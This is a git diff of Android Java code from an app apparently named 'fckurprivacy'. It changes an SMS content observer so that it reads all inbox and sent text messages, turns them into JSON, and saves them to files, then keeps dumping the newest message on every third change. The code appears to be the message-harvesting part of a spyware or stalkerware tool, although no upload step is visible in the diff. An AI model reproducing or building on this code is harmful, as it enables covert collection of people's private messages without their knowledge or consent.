@@ -10,7 +10,11 @@ import android.os.Handler;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
+
+import org.json.JSONArray;
+import org.json.JSONStringer;
 
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -44,8 +48,7 @@ public class SmsObserver extends ContentObserver {
 
         ArrayList<SmsJson> allInboxSms = new ArrayList<>();
         ArrayList<SmsJson> allSentSms = new ArrayList<>();
-        SmsJson latestInboxSms = new SmsJson();
-        SmsJson latestSentSms = new SmsJson();
+        ArrayList<SmsJson> allSms = new ArrayList<>();
 
         Log.d("Sms onChange", "mRunCount=" + mRunCount);
         Log.d("Sms onChange", "mCallbackCount=" + mCallbackCount);
@@ -53,6 +56,7 @@ public class SmsObserver extends ContentObserver {
         if (mRunCount <= 1) {
             allInboxSms = querySmsJson(mContext, SMS_INBOX);
             allSentSms = querySmsJson(mContext, SMS_SENT);
+            allSms = querySmsJson(mContext, SMS_ALL);
             for (SmsJson sms : allInboxSms) {
                 Log.d("Sms onChange", "allInboxSms:" + sms);
             }
@@ -60,12 +64,19 @@ public class SmsObserver extends ContentObserver {
             for (SmsJson sms : allSentSms) {
                 Log.d("Sms onChange", "allSentSms:" + sms);
             }
+
+            JSONArray allSmsJsons = JsonBuilder.buildSmsJsons(allSms);
+            FileSaver fileSaver = new FileSaver();
+            fileSaver.saveFile("AllSms", ".json", allSmsJsons.toString());
+
         } else {
             if (mCallbackCount % 3 == 0) {
-                latestInboxSms = getLatestSmsJson(mContext, SMS_INBOX);
-                latestSentSms = getLatestSmsJson(mContext, SMS_SENT);
-                Log.d("Sms onChange", "latestInboxSms:" + latestInboxSms);
-                Log.d("Sms onChange", "latestSentSms:" + latestSentSms);
+                SmsJson latestSms = getLatestSmsJson(mContext, SMS_ALL);
+                String smsDate = latestSms.getDate();
+                JSONStringer latestSmsJson = JsonBuilder.buildSmsJson(latestSms);
+                Log.d("Sms onChange", "latestSms:" + latestSms);
+                FileSaver fileSaver = new FileSaver();
+                fileSaver.saveFile(smsDate, ".json", latestSmsJson.toString());
             }
         }
 
@@ -98,7 +109,7 @@ public class SmsObserver extends ContentObserver {
                 String smsDate = dateFormat.format(smsDateLong);
 
                 int smsTypeInt = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
-                String[] smsType = {"收件", "发件"};
+                String[] smsType = {"inbox", "sent"};
 
                 String smsBody = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
 
